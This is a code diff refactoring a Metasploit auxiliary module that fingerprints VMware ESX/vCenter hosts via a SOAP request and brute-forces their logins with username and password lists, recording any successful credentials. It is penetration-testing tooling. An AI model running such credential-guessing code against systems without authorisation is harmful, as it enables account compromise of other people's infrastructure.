@@ -37,51 +37,19 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options(
 			[
+				OptString.new('URI', [true, "The default URI to login with", "/sdk"]),
 				Opt::RPORT(443)
 			], self.class)
 	end
 
-	# Mostly taken from the Apache Tomcat service validator
-	def check(ip)
-		soap_data = 
-			%Q|<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
-			<env:Body>
-			<RetrieveServiceContent xmlns="urn:vim25">
-				<_this type="ServiceInstance">ServiceInstance</_this>
-			</RetrieveServiceContent>
-			</env:Body>
-			</env:Envelope>|
-		datastore['URI'] ||= "/sdk"
-		begin
-			res = send_request_cgi({
-				'uri'     => datastore['URI'],
-				'method'  => 'POST',
-				'agent'   => 'VMware VI Client',
-				'data' =>  soap_data
-			}, 25)
-			if res
-				fingerprint_vmware(ip,res)
-			else
-				vprint_error("http://#{ip}:#{rport} - No response")
-			end
-		rescue ::Rex::ConnectionError => e
-			vprint_error("http://#{ip}:#{rport}#{datastore['URI']} - #{e}")
-			return false
-		rescue
-			vprint_error("Skipping #{ip} due to error - #{e}")
-			return false
-		end
-	end
-
-
 
 	def run_host(ip)
-		return unless check(ip)
+		return unless check
 		each_user_pass { |user, pass|
 			result = vim_do_login(user, pass)
 			case result
 			when :success
-				print_good "#{ip}:#{rport} - Successful Login! (#{user}:#{pass})"
+				print_good "#{rhost}:#{rport} - Successful Login! (#{user}:#{pass})"
 				report_auth_info(
 					:host   => rhost,
 					:port   => rport,
@@ -92,33 +60,70 @@ class Metasploit3 < Msf::Auxiliary
 				)
 				return if datastore['STOP_ON_SUCCESS']
 			when :fail
-				print_error "#{ip}:#{rport} - Login Failure (#{user}:#{pass})"
+				print_error "#{rhost}:#{rport} - Login Failure (#{user}:#{pass})"
 			end
 		}
 	end
 
-	def fingerprint_vmware(ip,res)
+
+	# Mostly taken from the Apache Tomcat service validator
+	def check
+		soap_data = 
+			%Q|<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+			<env:Body>
+			<RetrieveServiceContent xmlns="urn:vim25">
+				<_this type="ServiceInstance">ServiceInstance</_this>
+			</RetrieveServiceContent>
+			</env:Body>
+			</env:Envelope>|
+		
+		begin
+			res = send_request_cgi({
+				'uri'     => datastore['URI'],
+				'method'  => 'POST',
+				'agent'   => 'VMware VI Client',
+				'data'    => soap_data
+			}, 25)
+			
+			if res
+				fingerprint_vmware(res)
+			else
+				vprint_error("#{rhost}:#{rport} Error: no response")
+			end
+			
+		rescue ::Rex::ConnectionError => e
+			vprint_error("#{rhost}:#{rport} Error: could not connect")
+			return false
+		rescue
+			vprint_error("#{rhost}:#{rport} Error: #{e}")
+			return false
+		end
+	end
+	
+	def fingerprint_vmware(res)
 		unless res
-			vprint_error("http://#{ip}:#{rport} - No response")
+			vprint_error("#{rhost}:#{rport} Error: no response")
 			return false
 		end
 		return false unless res.body.include?('<vendor>VMware, Inc.</vendor>')
+		
 		os_match = res.body.match(/<name>([\w\s]+)<\/name>/)
 		ver_match = res.body.match(/<version>([\w\s\.]+)<\/version>/)
 		build_match = res.body.match(/<build>([\w\s\.\-]+)<\/build>/)
 		full_match = res.body.match(/<fullName>([\w\s\.\-]+)<\/fullName>/)
-		this_host = nil
+
 		if full_match
-			print_good "Identified #{full_match[1]}"
-			report_service(:host => (this_host || ip), :port => rport, :proto => 'tcp', :sname => 'https', :info => full_match[1])
+			print_good "#{rhost}:#{rport} - Identified #{full_match[1]}"
+			report_service(:host => rhost, :port => rport, :proto => 'tcp', :sname => 'https', :info => full_match[1])
 		end
+		
 		if os_match and ver_match and build_match
 			if os_match[1] =~ /ESX/ or os_match[1] =~ /vCenter/
-				this_host = report_host( :host => ip, :os_name => os_match[1], :os_flavor => ver_match[1], :os_sp => "Build #{build_match[1]}" )
+				this_host = report_host( :host => rhost, :os_name => os_match[1], :os_flavor => ver_match[1], :os_sp => "Build #{build_match[1]}" )
 			end
 			return true
 		else
-			vprint_error("http://#{ip}:#{rport} - Could not identify as VMWare")
+			vprint_error("#{rhost}:#{rport} Error: Could not identify as VMWare")
 			return false
 		end
 
